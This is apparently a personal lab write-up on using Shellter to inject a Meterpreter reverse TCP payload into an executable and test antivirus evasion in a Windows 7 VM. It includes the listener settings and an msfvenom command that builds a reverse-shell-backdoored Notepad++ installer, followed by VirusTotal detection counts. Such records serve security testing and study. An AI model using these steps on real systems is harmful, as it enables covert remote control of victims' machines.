---
title: Installing and Using Shellter
translation_id: shellter-lab
source_digest: 72e0789a8a118e635f330b83c123f624ab6294bfed3eec83b10e6fe402f7b490
tags:
  - Shellter
  - Metasploit
  - Antivirus Evasion
categories:
  - Cybersecurity
  - Security Labs
sections: {"shellter-installation": "shellter-安装", "using-shellter": "shellter-使用", "execution-and-detection": "利用-免杀效果", "execution": "利用", "detection-results": "免杀效果"}
---

Shellter modifies executables using dynamic shellcode injection. I recorded how I installed and used it, and what I observed in a Windows 7 VM.
<!-- more -->

:::info
I used Shellter 7.2 on Kali Linux and a Windows 7 x64 guest running 360 security software. The results describe this test and its software versions.
:::

## Shellter installation

I ran Shellter under Wine on Kali. The setup needed i386 support and the corresponding dependencies. The screenshots show a root session.

1. Enable the i386 architecture, refresh the package index and install the Wine dependency:

   `dpkg --add-architecture i386 && apt update && apt -y install wine32`

2. Install Shellter with `apt install shellter`.

![Install Shellter 7.2 in Kali](https://res.cloudinary.com/sycamore/image/upload/v1792696727/Typora/2026/05/0c4297a033272d1212d9cb86e4daf005.png)

## Using Shellter

I used automatic mode to inject `Meterpreter_Reverse_TCP` into the test executable. The following section records the prompts shown by the tool.


1. I entered `shellter` at the command line to start the tool.
2. I entered A (or a) for automatic mode.
3. At the PE Target prompt I supplied the path to the test executable.

![Starting Shellter and selecting automatic mode and the test executable](https://res.cloudinary.com/sycamore/image/upload/v1792696731/Typora/2026/05/272fa29e9da9d004a3cf25b87079f7de.png)

4. I answered Y at the Enable Stealth Mode? prompt.

![Shellter asking whether to enable Stealth Mode](https://res.cloudinary.com/sycamore/image/upload/v1792696732/Typora/2026/05/0ac54c6f74fda57f2a51ac0b8bde409f.png)

5. I entered L to use one of the listed payloads.
6. I chose option 1, Meterpreter_Reverse_TCP.

![Selecting Meterpreter_Reverse_TCP from the payload list](https://res.cloudinary.com/sycamore/image/upload/v1792696733/Typora/2026/05/073c31195d0c78a68e8b3c2fecbc8531.png)

7. I entered the listener’s IP address and port.

![Entering the listener address and port](https://res.cloudinary.com/sycamore/image/upload/v1792696735/Typora/2026/05/396417290b20f351cc3c1d96669a3c4e.png)

8. When the screen showed Injection: Verified! I pressed Enter to finish.

![Shellter confirming that the injection was verified](https://res.cloudinary.com/sycamore/image/upload/v1792696735/Typora/2026/05/0169aba2f4b7dfa0ba83b3304994339f.png)

> The tool replaced the file at the original path without changing its name. In this environment it saved the original under `/root/Shellter_Backups/`.

![Processed file with original file backup in Shellter_Backups](https://res.cloudinary.com/sycamore/image/upload/v1792696736/Typora/2026/05/9b58fed5ce217d4b84967579f2522d55.png)

## Execution and detection

### Execution


I transferred the processed file to the Windows 7 x64 guest, opened msfconsole on Kali and used the following settings for the listener:

- `use exploit/multi/handler`
- `set payload windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.158.139`
- `set LPORT 4444`
- `run`

Running the test program resulted in a connection and a Meterpreter session.

![The listener reporting an open Meterpreter session](https://res.cloudinary.com/sycamore/image/upload/v1792696737/Typora/2026/05/4eff497abdd31d7be53e51e0d88f75f7.png)

### Detection results

The Windows 7 x64 guest was running 360. There was no warning during the initial file check or immediately after the session opened. The alert below appeared roughly a minute later.

![Trojan warning from 360 security software](https://res.cloudinary.com/sycamore/image/upload/v1792696739/Typora/2026/05/69719cbb27c9df97660f0c6405be89c7.png)

That delay did not mean the sample had escaped detection. A repeat encounter seemed to trigger the alert sooner, but this experiment wasn’t enough to establish a typical response time.

I also submitted the sample to VirusTotal. In the captured report, 31 of 70 engines flagged it. [Report](https://www.virustotal.com/gui/file/e4e97bef85f3970d42e81d6f75815050d7ff2370790888fe9d78948bc83b30a7)

![VirusTotal reporting 31 detections out of 70 for the Shellter sample](https://res.cloudinary.com/sycamore/image/upload/v1792696739/Typora/2026/05/6a65ae126f5f5f5c0658d6165d837a04.png)

For comparison I tested another sample made from the same host program and payload using the msfvenom template approach.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe > mp_npp.exe
```


The second report recorded 40 detections out of 70. [Report](https://www.virustotal.com/gui/file/c3a7c2280e4aa9aa0693729049f7f8e0ff05e253c1047ef282748c3509687207)

![VirusTotal test for msfvenom sample is 40/70](https://res.cloudinary.com/sycamore/image/upload/v1792696740/Typora/2026/05/c0631de31f6d8f365c052ec14a014b37.png)

Fewer engines flagged the Shellter sample in these reports. Both samples were detected by multiple engines.

This was one experiment with Shellter. A single comparison cannot establish how effective a tool is; engines and their definitions change.
